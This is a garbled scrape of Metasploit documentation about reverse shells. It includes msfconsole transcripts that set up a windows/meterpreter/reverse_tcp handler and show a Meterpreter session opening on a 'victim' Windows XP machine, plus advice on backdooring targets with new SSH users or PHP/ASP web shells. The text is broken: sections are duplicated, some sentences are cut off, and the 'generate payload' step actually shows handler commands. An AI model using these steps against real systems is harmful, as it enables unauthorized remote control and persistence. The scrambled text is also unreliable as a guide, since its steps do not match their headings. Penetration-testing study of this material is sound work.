## On this page
## List of Metasploit reverse shells
To get a list of reverse shells, use the `msfpayload` command. B
```bash
./msfpayload -l |grep reverse
```

### Windows common reverse shell
### Linux common reverse shell
## When to use a reverse shell
## When a reverse shell isn't needed
## How to set up for a reverse shell during payload generation
## Demonstration
### Step 1: Generate the executable payload
On the attacker's box, run `msfpayload` or `msfvenom`:
```bash
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
```

### Step 2: Copy the executable payload to box B
### Step 3: Set up the payload handler on box A
Box A is the attacker machine.
```bash
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
[*] Sending stage (770048 bytes) to 192.168.1.80
[*] Meterpreter session 1 opened (192.168.1.123:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500
meterpreter >
```

`bash
./msfpayload -l |grep reverse
`

` has been the most stable.

## When to use a reverse shell

If you find yourself in one of the following scenarios, then you should consider using a reverse shell:

* The target machine is behind a different private network.
* The target machine's firewall blocks incoming connection attempts to your bindshell.
* Your payload is unable to bind to the port it wants due to whatever reason.
* You can't decide what to choose.

## When a reverse shell isn't needed

Generally speaking, if you can backdoor an existing service, you may not need a reverse shell. For example, if the target machine is already running an SSH server, then you can try adding a new user to it and use that.

If the target machine is running a web server that supports a server-side programming language, then you can leave a backdoor in that language. For example, many Apache servers support PHP, then you can use a PHP "web shell". IIS servers usually support ASP or ASP.net. The Metasploit Framework offers payloads in all these languages and many others.

This also applied to VNC, remote desktop, SMB (psexec), or other remote admin tools, etc.

## How to set up for a reverse shell during payload generation

When you generate a reverse shell with either `

`, you must know how to configure the following:

* **LHOST** - This is the IP address you want your target machine to connect to. If you're in a local area network, it is unlikely your target machine can reach you unless you both are on the same network. In that case, you will have to [find out your public-facing IP address](https://www.google.com/webhp?q=ip#q=ip), and then configure your network to port-forward that connection to your box. LHOST should not be "localhost", or "0.0.0.0", or "127.0.0.1", because if you do, you're telling the target machine to connect to itself (or it may not work at all).
* **LPORT** - This the port you want your target machine to connect to.

When you set up a listener for the reverse shell, you also at least need to configure LHOST and LPORT, but slightly different meanings (different perspective):

* **LHOST** - This is the IP address you want your listener to bind to.
* **LPORT** - This is the port you want your listener to bind to.

You should make sure the listener has started first before executing the reverse shell.

## Demonstration

In this demonstration, we have two boxes:

**Box A:**

* The attacker's box that receives the payload session
* IP is: 192.168.1.123 (ifconfig)
* On the same network as the victim machine

**Box B:**

* The "victim" machine
* Windows XP
* IP is: 192.168.1.80 (ipconfig)
* On the same network as the attacker machine
* For testing purposes, no antivirus enabled.
* For testing purposes, no firewall enabled, either.

### Step 1: Generate the executable payload

On the attacker's box, run `

`bash
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
`

`bash
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
[*] Sending stage (770048 bytes) to 192.168.1.80
[*] Meterpreter session 1 opened (192.168.1.123:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500
meterpreter >
`

